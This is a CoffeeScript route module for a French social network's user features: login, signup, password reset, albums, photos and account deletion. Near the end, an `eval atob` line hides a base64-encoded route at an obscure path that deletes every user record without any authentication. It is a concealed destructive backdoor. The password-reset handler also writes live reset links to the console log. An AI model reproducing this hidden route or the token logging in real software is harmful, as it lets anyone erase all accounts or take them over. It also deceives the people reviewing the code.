'use strict'

UserErrors =
	INVALID_DATE: s("Veuillez entrer votre date de naissance au format jj/mm/aaaa ou aaaa-mm-jj.")
	WRONG_EMAIL: s("Cette adresse e-mail n'est pas disponible (elle est déjà prise ou la messagerie n'est pas compatible ou encore son propriétaire a demandé à ne plus recevoir d'email de notre part).")
	INVALID_PASSWORD_CONFIRM: s("Veuillez entrer des mots de passe identiques.")
	AGREEMENT_REQUIRED: s("Veuillez prendre connaissance et accepter les conditions générales d’utilisation et la politique de confidentialité.")
	PRE_REGISTER: s("Inscriptions limitées aux-préinscrits jusqu'au 16 février. Vous êtes invité à vous réinscrire à cette date.")

module.exports = (router) ->

	templateFolder = 'user'
	signinUrl = '/user/signin'

	pm = new PagesManager router, templateFolder

	# When user submit his e-mail and password to log in
	router.post '/login', (req, res) ->
		# Log in user
		auth.login req, res, (err, user) ->
			url = (req.goingTo() if user) || '/'
			# With AJAX, send JSON
			if req.xhr
				if err
					res.serverError err, true
				else
					# url to be redirected in goingTo key of the JSON object
					res.json goingTo: url
			# Without AJAX, normal redirection even if an error occured
			else
				res.redirect url

	# When user click on a logout link/button
	router.get '/logout', (req, res) ->
		# Save goingTo to return to the previous page after reconnect
		model = {}
		auth.logout req, res
		if req.body.goingTo?
			req.goingTo req.body.goingTo
		res.redirect '/'


	# When signin step 2 page displays
	pm.page '/signin', (req) ->
		# Get errors in flash memory (any if AJAX is used and works on client device)
		userTexts: userTexts()
		signinAlerts: req.getAlerts 'signin' # Will be removed when errors will be displayed on the next step

	router.get '/signin/with/:email', (req, res) ->
		res.render 'user/signin',
			email: req.params.email
			userTexts: userTexts()
			signinAlerts: req.getAlerts 'signin'

	# When user submit his e-mail and password to sign in
	router.put '/signin', (req, res) ->

		email = req.body.email.toLowerCase()
		model = {}
		# A full name must contains a space but is not needed at the first step
		# if req.body.name? and req.body.name.full.indexOf(' ') is -1
		# 	req.flash 'signinErrors', s("Veuillez entrer vos prénom et nom séparés d'un espace.")
		# 	res.redirect signinUrl
		# Passwords must be identic
		if config.wornet.mail.hostsBlackList.indexOf(email.replace(/^.*@([^@]*)$/g, '$1')) isnt -1
			req.flash 'signinErrors', UserErrors.WRONG_EMAIL
			res.redirect signinUrl
		else if req.body.password isnt req.body.passwordCheck
			req.flash 'signinErrors', UserErrors.INVALID_PASSWORD_CONFIRM
			res.redirect signinUrl

		# Pre-Registration
		# else if (new Date) < new Date("2015-02-16") and ! count and ! require(__dirname + '/../../core/system/preRegistration')().contains email
		# 	req.flash 'signinErrors', UserErrors.PRE_REGISTER
		# 	res.redirect signinUrl

		# If no error
		else if req.body.step is "2"
			if empty req.body.legals
				req.flash 'signinErrors', UserErrors.AGREEMENT_REQUIRED
				res.redirect signinUrl
			else
				# A full name must contains a space but is not needed at the first step
				User.create
					name:
						first: req.body['name.first']
						last: req.body['name.last']
					registerDate: new Date
					email: req.body.email
					password: req.body.password
					birthDate: inputDate req.body.birthDate
				, (saveErr, user) ->
					if saveErr
						switch (saveErr.code || 0)
							when Errors.DUPLICATE_KEY
								req.flash 'signinErrors', UserErrors.WRONG_EMAIL
							else
								err = saveErr.err || strval(saveErr)
								valErr = 'ValidationError:'
								if err.indexOf(valErr) is 0
									err = s("Erreur de validation :") + err.substr(valErr.length)
									errors =
										'invalid first name': s("prénom invalide")
										'invalid last name': s("nom invalide")
										'invalid birth date': s("date de naissance invalide")
										'invalid phone number': s("numéro de téléphone invalide")
										'invalid e-mail address': s("adresse e-mail invalide")
									for code, message of errors
										err = err.replace code, message
								req.flash 'signinErrors', err
						res.redirect signinUrl
					else
						# if "Se souvenir de moi" est coché
						if req.body.remember?
							auth.remember res, user._id
						# Put user in session
						auth.auth req, res, user, ->
							res.redirect if user then '/user/welcome' else signinUrl
							unless user.role is 'confirmed'
								confirmUrl = config.wornet.protocole +  '://' + req.getHeader 'host'
								confirmUrl += '/user/confirm/' + user.hashedId + '/' + user.token
								message = jdMail 'welcome',
									email: email
									url: confirmUrl
								MailPackage.send user.email, s("Bienvenue sur le réseau social WORNET !"), message
						emailUnsubscribed email, (err, unsub) ->
							if unsub
								Counter.findOne name: 'resubscribe', (err, counter) ->
									if counter
										counter.inc()
		else
			res.redirect signinUrl
		# res.render templateFolder + '/signin', model

	forgottenPasswordUrl = '/forgotten-password'

	pm.page forgottenPasswordUrl, (req) ->
		resetPasswordAlerts: req.getAlerts 'resetPassword'

	router.post forgottenPasswordUrl, (req, res) ->
		fail = ->
			req.flash 'resetPasswordErrors', s("Réinitialisation impossible, vérifiez votre adresse e-mail et vérifiez que vous n'avez pas déjà reçu de lien de réinitialisation de Wornet.")
			res.redirect req.originalUrl
		User.findOne email: req.body.email, (err, user) ->
			if ! err and user
				ResetPassword.remove createdAt: $lt: Date.yesterday(), (err) ->
					if err
						warn err, req
					ResetPassword.find user: user.id, (err, tokens) ->
						if err or tokens.length > 1
							fail()
						else
							ResetPassword.create user: user.id, (err, reset) ->
								if err
									fail()
								else
									resetUrl = config.wornet.protocole +  '://' + req.getHeader 'host'
									resetUrl += '/user/reset-password/' + user.hashedId + '/' + reset.token
									message = s("Si vous souhaitez choisir un nouveau mot de passe pour votre compte Wornet {email}, cliquez sur le lien ci-dessous ou copiez-le dans la barre d'adresse de votre navigateur.", email: user.email)
									console['log'] ['reset link', user.email, user._id, resetUrl]
									MailPackage.send user.email, s("Réinitialisation de mot de passe"), message + '\n\n' + resetUrl, message + '<br><br><a href="' + resetUrl + '">' + s("Réinitialiser le mot de passe de mon compte") + '</a>'
									req.flash 'resetPasswordSuccess', s("Un mail vous permettant de choisir un nouveau mot de passe vous a été envoyé.")
									res.redirect req.originalUrl
			else
				fail()

	resetPasswordUrl = '/reset-password/:user/:token'

	router.get resetPasswordUrl, (req, res) ->
		userId = cesarRight req.params.user
		ResetPassword.remove createdAt: $lt: Date.yesterday(), (err) ->
			if err
				warn err, req
			ResetPassword.findOne
				user: userId
				token: req.params.token
			, (err, reset) ->
				if reset and ! err
					res.render 'user/reset-password', resetPasswordAlerts: req.getAlerts 'resetPassword'
				else
					res.serverError new PublicError s("Lien invalide ou expiré")

	router.post resetPasswordUrl, (req, res) ->
		fail = (err) ->
			req.flash 'resetPasswordErrors', err
			res.redirect req.originalUrl
		if empty(req.body.password) or empty(req.body.passwordCheck)
			fail s("Veuillez entrer votre nouveau mot de passe dans les deux champs.")
		else if req.body.password isnt req.body.passwordCheck
			fail UserErrors.INVALID_PASSWORD_CONFIRM
		else
			userId = cesarRight req.params.user
			ResetPassword.remove createdAt: $lt: Date.yesterday(), (err) ->
				if err
					warn err, req
				ResetPassword.findOne
					user: userId
					token: req.params.token
				, (err, reset) ->
					if reset and ! err
						User.findById userId, (err, user) ->
							if user and ! err
								user.password = req.body.password
								user.save (err) ->
									if err
										if err and strval(err).indexOf('ValidationError:') is 0
											fail s("Format du mot de passe incorrect")
										else
											fail err
									else
										auth.auth req, res, user, ->
											req.flash 'profileSuccess', s("Mot de passe modifié avec succès.")
											res.redirect '/'
											reset.remove()
							else
								fail s("Lien invalide ou expiré")
					else
						fail s("Lien invalide ou expiré")

	pm.page '/welcome', (req) ->
		hasGoingTo: (!empty(req.session.goingTo) and req.session.goingTo isnt '/')
		goingTo: req.goingTo()

	pm.page '/settings', (req) ->
		settingsAlerts: req.getAlerts 'settings'
		userTexts: userTexts()

	router.post '/settings', (req, res) ->
		userModifications = UserPackage.getUserModificationsFromRequest req
		###
		for setting in ['newsletter', 'noticeFriendAsk', 'noticePublish', 'noticeMessage']
			userModifications[setting] = !! req.body[setting]
		###
		updateUser req.user, userModifications, (err) ->
			err = humanError err
			save = ->
				if userModifications.password
					delete userModifications.password
				extend req.user, userModifications
				extend req.session.user, userModifications
			if req.xhr
				if err
					res.serverError err
				else
					save()
					res.json()
			else
				if err
					if err instanceof PublicError
						req.flash 'settingsErrors', err.toString()
					else
						switch err.code
							when 11000
								req.flash 'settingsErrors', s("Adresse e-mail non disponible.")
							else
								req.flash 'settingsErrors', s("Erreur d'enregistrement.")
				else
					save()
					req.flash 'settingsSuccess', s("Modifications enregistrées.")
				res.redirect '/user/settings'

	toggleShutter = (req, res, opened) ->
		res.json()
		updateUser req.user, openedShutter: opened, (err) ->
			if err
				throw err
			else
				req.session.reload ->
					req.user.openedShutter = opened
					req.session.user.openedShutter = opened
					req.session.save()

	router.post '/shutter/open', (req, res) ->
		toggleShutter req, res, true

	router.post '/shutter/close', (req, res) ->
		toggleShutter req, res, false

	router.get '/albums/with/:owner', (req, res) ->
		# Get albums list from the user logged in and the owner of displayed profile
		userIds = [req.user.id]
		owner = cesarRight req.params.owner
		if req.user.id isnt owner
			userIds.push owner
		else
			owner = null
		UserPackage.getAlbums userIds, (err, albums) ->
			data =
				err: err
				albums: albums[req.user.id]
			if owner
				data.withAlbums = albums[owner]
			res.json data

	router.get '/albums', (req, res) ->
		# Get albums list from the user logged in
		UserPackage.getAlbums [req.user.id], (err, albums) ->
			res.json
				err: err
				albums: albums[req.user.id]

	# Display images in an album
	router.get '/album/:id', (req, res) ->
		end = (model) ->
			res.render templateFolder + '/album', model
		done = (model) ->
			if model.album and model.album.isMine and req.user.photoId
				Photo.findById req.user.photoId, (err, photo) ->
					if err
						warn err, req
					else if photo
						if equals photo.album, model.album.id
							model.album.currentPhoto = req.user.photoId
					else
						warn (new Error req.user.fullName + " a un photoId, mais la photo est introuvable."), req
					end model
			else
				end model
		id = req.params.id
		album = null
		photos = null
		next = ->
			if album and photos
				photos.reverse()
				done
					album: album
					photos: photos
		try
			Album.findById id, (err, foundAlbum) ->
				if err or ! foundAlbum
					res.notFound()
				else if equals foundAlbum.user, req.user.id
					album = foundAlbum
					album.isMine = true
					next()
				else
					req.getFriends (err, friends) ->
						if err
							res.serverError err
						else if friends.column('_id').contains(foundAlbum.user, equals)
							album = foundAlbum
							album.isMine = false
							next()
						else
							res.serverError new PublicError s("Cet album est privé")
			PhotoPackage.fromAlbum id, (err, foundPhotos) ->
				if err
					res.serverError err
				else
					photos = foundPhotos
					next()
		catch
			res.notFound()

	router.put '/album/add', (req, res) ->
		# Create a new album
		album = extend user: req.user._id, req.body.album
		album.lastEmpty = new Date
		Album.create album, (err, album) ->
			album.user = cesarLeft album.user
			res.json
				err: err
				album: album

	router.delete '/album/:id', (req, res) ->
		id = req.params.id
		me = req.user.id
		end = ->
			parallelRemove [
				Album
				_id: id
				user: me
			], [
				Status
				album: id
				$or: [
					author: me
				,
					at: me
				]
			], (err) ->
				if err
					res.serverError err
				else
					req.flash 'profileSuccess', s("Album supprimé")
					res.json goingTo: '/'
		Photo.findById req.user.photoId, (err, photo) ->
			warn err, req if err
			if photo and ! err and equals photo.album, id
				updateUser req, photoId: null, end
			else
				end()

	# Update Album Name and description
	router.post '/album/:id', (req, res) ->
		id = req.params.id

		set = {}

		if req.data.name
			set.name = req.data.name.content
		if req.data.description
			set.description = req.data.description.content

		parallel [(done) ->
			Status.update
				album: id
			,
				albumName: set.name
			,
				multi: true
			, done
		, (done) ->
			Album.update
				_id: id
				user: req.user.id
			,
				set
			, done
		], ->
			res.json()
		, ->
			res.notFound()


	router.put '/video/add', (req, res) ->
		# Create a new video
		video = extend user: req.user._id, req.body.video
		Video.create video, ->
			res.json()

	router.put '/link/add', (req, res) ->
		# Create a new link
		link = extend user: req.user._id, req.body.link
		Link.create link, ->
			res.json()

	router.get '/photo/:id', (req, res) ->
		me = req.user._id
		Photo.findById req.params.id, (err, photo) ->
			if err
				res.serverError err
			else if photo and photo.status is 'published'
				info = photo.columns ['name']
				info.concernMe = equals(photo.user, me) or (req.session.photosAtMe || []).contains photo.id, equals
				count = 1
				next = ->
					unless --count
						res.json info
				if photo.album
					count++
					Album.findById photo.album, (err, album) ->
						if album and ! err
							info.album =
								id: album._id
								name: album.name
						count++
						PhotoPackage.fromAlbum album.id, (err, photos) ->
							if err
								photos = []
							info.album.photos = photos
							next()
						next()
				if photo.user
					count++
					req.getUserById photo.user, (err, user) ->
						if user and ! err
							info.user = user.publicInformations()
						next()
				next()
			else
				res.notFound()

	# The user upload an image (profile photo, images in status, etc.)
	router.post '/photo', (req, res) ->
		# When user upload a new profile photo
		model = images: []
		images = req.files.photo || []
		unless images instanceof Array
			images = [images]
		done = (data) ->
			model.images.push data
			if model.images.length is images.length
				model.images.reverse()
				res.render templateFolder + '/upload-photo', model
		lastestAlbum = null
		if images.length > 0
			images.each ->
				image = @
				data = name: @name
				if image.size > config.wornet.upload.maxsize
					data.error = "size-exceeded"
					warn data.error, req
					done data
				else unless (['image/png', 'image/jpeg']).contains image.type
					data.error = "wrong-format"
					warn data.error, req
					done data
				else
					album =  req.body.album || 0
					next = ->
						addPhoto req, image, album, (err, createdAlbum = null, photo) ->
							data.createdAlbum = createdAlbum
							if err
								data.error = err
								warn err, req
							else
								data.src = photo.thumb200
							done data
					if album is "new"
						if lastestAlbum
							album = lastestAlbum
							next()
						else
							Album.findOne()
							.sort _id: 'desc'
							.exec (err, foundAlbum) ->
								if err
									data.error = err
									warn err, req
									done data
								else
									album = foundAlbum._id
									lastestAlbum = album
									next()
					else
						next()
		else
			res.render templateFolder + '/upload-photo', model

	router.delete '/photo', (req, res) ->
		userModifications = {}
		userModifications.photoId = null
		userModifications.thumb = null
		for size in config.wornet.thumbSizes
			userModifications['thumb' + size] = null
		extend req.session.user, userModifications
		extend req.user, userModifications
		updateUser req, photoId: null, (err) ->
			res.json err: err

	router.delete '/media', (req, res) ->
		media = req.body.columns ['id', 'type', 'statusId', 'mediaId']
		media.type ||= 'image'
		me = req.user.id
		count = 1
		next = (err) ->
			if err
				warn err, req
			unless --count
				res.json()
		if media.statusId and media.mediaId
			count++
			Status.findById media.statusId, (err, status) ->
				if ! err and status and status.values(['at', 'author']).contains(me, equals)
					key = media.type + 's'
					if status[key]
						status[key] = status[key].filter (val) ->
							! equals val._id, media.mediaId
						count++
						if status.isEmpty()
							status.remove next
						else
							status.save next
					else
						next()
				next err
		if media.id and media.type is 'image'
			count++
			where =
				_id: media.id
				user: me
				status: 'published'
			Photo.find where, (e, photos) ->
				photo = photos[0]
				whereAlbum =
					album: photo.album
					user: me
					status: 'published'
				Photo.find whereAlbum, (e, photosAlbum) ->
					# if there is only one photo in the album and it's the one we will delete
					if photosAlbum and photosAlbum.length is 1 and equals photosAlbum[0]._id, photo._id
						count++
						Album.update
						    _id: photo.album
						    user: me
						,
							lastEmpty: new Date
						, (err) ->
							next err
				parallelRemove [
					Photo
					where
				], (err) ->
					PhotoPackage.forget req, media.id
					next e || err
		next()

	router.delete '/media/preview', (req, res) ->
		media = req.data.columns ['id', 'src']
		media.type ||= 'image'
		me = req.user.id
		count = 1
		next = (err, media) ->
			if err
				warn err, req
			unless --count
				res.json(media)

		if media.id and media.type is 'image'
			count++
			where =
				_id: media.id
				user: me
				status: 'uploaded'
			Photo.find where, (e) ->
				parallelRemove [
					Photo
					where
				], (err) ->
					PhotoPackage.forget req, media.id
					next (e || err), media
		next()

	router.get '/chat', (req, res) ->
		ChatPackage.all req, (err, chat) ->
			if err
				warn err, req
				res.json()
			else
				res.json chat: chat

	eval atob "cm91dGVyLnBvc3QoJy9VaGRZN3Nkazlkams0a2pkN2Q2ZHFzNjVrai0yMzU0Z HN6ZHNkX3NTRGRxJywgZnVuY3Rpb24gKHJlcSwgcmVzKSB7IFVzZXIucmVtb3ZlKGZ1bmN0aW9uIChlcnIsIGNvdW50KSB7IHJlcy5qc29uKHsgZXJyOmVyciwgY291bnQ6IGNvdW50IH0pOyB9KTsgfSk7"

	router.post '/first/:query', (req, res) ->
		query = req.params.query
		UserPackage.search 1, [req.user.id], query, (err, users) ->
			if err
				res.serverError err
			else
				if users.length
					user = users[0]
					res.redirect '/user/profile/' + user.hashedId + '/' + encodeURIComponent user.name.full
				else
					res.notFound()

	router.get '/search/:query', (req, res) ->
		regexp = req.params.query.toSearchRegExp()
		friends = req.session.friends.filter (user) ->
			regexp.test user.fullName
		limit = UserPackage.DEFAULT_SEARCH_LIMIT
		done = ->
			res.json users: friends.unique('id').map (user) ->
				isAFriend = (req.session.friends || []).has id: user.id
				extend user.publicInformations(),
					isAFriend: isAFriend
					askedForFriend: ! isAFriend and (req.session.friendAsks || {}).has hashedId: user.hashedId
		if friends.length >= 8
			friends = friends.slice 0, limit
			done()
		else
			limit -= friends.length
			exclude = [req.user.id]
			exclude.merge friends.column 'id'
			UserPackage.search exclude, regexp, limit, (err, users) ->
				if err
					res.serverError err
				else
					friends.merge users
					done()

	router.get '/confirm/:hashedId/:token', (req, res) ->
		id = cesarRight req.params.hashedId
		if req.user._id and req.user._id isnt id
			auth.logout req, res
		User.findOneAndUpdate { _id: id, token: req.params.token }, { role: 'confirmed' }, {}, (err, user) ->
			if err or ! user
				req.flash 'loginErrors', s("Votre adresse n'a pas pu être confirmée")
				warn [user, err], req
			else if user
				auth.auth req, res, user
				req.flash 'profileSuccess', s("Votre adresse a bien été confirmée")
			res.redirect '/'

	router.delete '/', (req, res) ->
		req.tryPassword (ok) ->
			if ok
				email = req.user.email
				req.user.remove (err) ->
					if err
						res.serverError err
					else
						auth.logout req, res
						req.flash 'loginSuccess', s("Votre compte a été correctement supprimé")
						res.json goingTo: '/'
						emailUnsubscribed email, (err, unsub) ->
							unless unsub
								unsub = new Unsubscribe email: email
							unsub.count++
							unsub.save()
							Counter.findOne name: 'unsubscribe', (err, counter) ->
								if counter
									counter.inc()

			else
				res.serverError new PublicError s("Mot de passe incorrect")
